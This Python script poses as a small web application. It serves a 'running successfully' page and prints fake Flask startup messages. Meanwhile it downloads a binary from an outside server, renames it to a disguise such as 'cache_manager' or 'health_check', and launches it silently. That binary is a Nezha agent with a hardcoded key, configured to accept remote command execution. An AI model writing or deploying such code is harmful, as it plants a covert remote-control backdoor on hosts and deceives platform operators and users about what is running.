import os
import time
import subprocess
import platform
import random
import sys
from threading import Thread
from http.server import HTTPServer, SimpleHTTPRequestHandler

# Environment variables
FILE_PATH = os.environ.get('FILE_PATH', '.cache')
PORT = int(os.environ.get('PORT', 3000))
NEZHA_SERVER = os.environ.get('NEZHA_SERVER', 'nezha.loc.cc:443')
NEZHA_PORT = os.environ.get('NEZHA_PORT', '')
NEZHA_KEY = os.environ.get('NEZHA_KEY', '4z0HWnSGJtKFtKOlfJxSkNC3F8PIJ448')
UUID = os.environ.get('UUID', 'deef2009-c4e2-4f01-a7d9-0d40b468d258')

# Random file names for disguise
DISGUISE_NAMES = ['cache_manager', 'session_handler', 'task_worker', 'log_rotator', 'health_check']

def get_random_name():
    return random.choice(DISGUISE_NAMES)

class QuietHTTPHandler(SimpleHTTPRequestHandler):
    """HTTP Handler that serves files quietly"""
    
    def log_message(self, format, *args):
        pass  # Suppress logging
    
    def do_GET(self):
        if self.path == '/' or self.path == '/index.html':
            self.serve_index()
        else:
            super().do_GET()
    
    def serve_index(self):
        index_path = 'index.html'
        if os.path.exists(index_path):
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            with open(index_path, 'rb') as f:
                self.wfile.write(f.read())
        else:
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            default_html = b'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        .container {
            text-align: center;
            padding: 40px;
            background: rgba(255,255,255,0.1);
            border-radius: 20px;
            backdrop-filter: blur(10px);
        }
        h1 { margin-bottom: 10px; }
        p { opacity: 0.8; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Welcome</h1>
        <p>Application is running successfully.</p>
    </div>
</body>
</html>'''
            self.wfile.write(default_html)

def run_web_server():
    """Run HTTP server in background"""
    server = HTTPServer(('0.0.0.0', PORT), QuietHTTPHandler)
    server.serve_forever()

def fake_startup():
    """Display fake Flask/web app startup messages"""
    print("Starting application...")
    time.sleep(0.3)
    print(" * Loading configuration...")
    time.sleep(0.2)
    print(" * Initializing modules...")
    time.sleep(0.2)
    print(" * Starting background workers...")
    time.sleep(0.2)
    print(f" * Running on http://0.0.0.0:{PORT}")
    print(" * Application started successfully")
    print("Press CTRL+C to quit")
    sys.stdout.flush()

def create_directory():
    if not os.path.exists(FILE_PATH):
        os.makedirs(FILE_PATH)

def get_system_architecture():
    architecture = platform.machine().lower()
    if 'arm' in architecture or 'aarch64' in architecture:
        return 'arm'
    else:
        return 'amd'

def download_file(file_name, file_url):
    file_path = os.path.join(FILE_PATH, file_name)
    try:
        import requests
        response = requests.get(file_url, stream=True, timeout=30)
        response.raise_for_status()
        
        with open(file_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        return True
    except:
        if os.path.exists(file_path):
            os.remove(file_path)
        return False

def get_download_url(architecture):
    if not NEZHA_SERVER or not NEZHA_KEY:
        return None
    
    if NEZHA_PORT:
        return "https://arm64.ssss.nyc.mn/agent" if architecture == 'arm' else "https://amd64.ssss.nyc.mn/agent"
    else:
        return "https://arm64.ssss.nyc.mn/v1" if architecture == 'arm' else "https://amd64.ssss.nyc.mn/v1"

def authorize_files(file_path):
    if os.path.exists(file_path):
        try:
            os.chmod(file_path, 0o775)
        except:
            pass

def exec_cmd(command):
    try:
        subprocess.Popen(
            command, 
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
    except:
        pass

def run_agent():
    if not NEZHA_SERVER or not NEZHA_KEY:
        return
    
    architecture = get_system_architecture()
    disguise_name = get_random_name()
    url = get_download_url(architecture)
    
    if not url:
        return
    
    if not download_file(disguise_name, url):
        return
    
    agent_path = os.path.join(FILE_PATH, disguise_name)
    authorize_files(agent_path)
    
    port = NEZHA_SERVER.split(":")[-1] if ":" in NEZHA_SERVER else ""
    tls_ports = ['443', '8443', '2096', '2087', '2083', '2053']

    if NEZHA_PORT:
        nezha_tls_flag = '--tls' if NEZHA_PORT in tls_ports else ''
        command = f"nohup {agent_path} -s {NEZHA_SERVER}:{NEZHA_PORT} -p {NEZHA_KEY} {nezha_tls_flag} >/dev/null 2>&1 &"
    else:
        nezha_tls = "true" if port in tls_ports else "false"
        config_yaml = f"""client_secret: {NEZHA_KEY}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: false
ip_report_period: 1800
report_delay: 4
server: {NEZHA_SERVER}
skip_connection_count: false
skip_procs_count: false
temperature: false
tls: {nezha_tls}
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: {UUID}"""
        
        config_path = os.path.join(FILE_PATH, 'config.yaml')
        with open(config_path, 'w') as f:
            f.write(config_yaml)
        
        command = f"nohup {agent_path} -c \"{config_path}\" >/dev/null 2>&1 &"
    
    exec_cmd(command)

def main():
    create_directory()
    run_agent()
    
    # Start web server in background thread
    server_thread = Thread(target=run_web_server, daemon=True)
    server_thread.start()
    
    fake_startup()
    
    while True:
        time.sleep(3600)

if __name__ == "__main__":
    main()
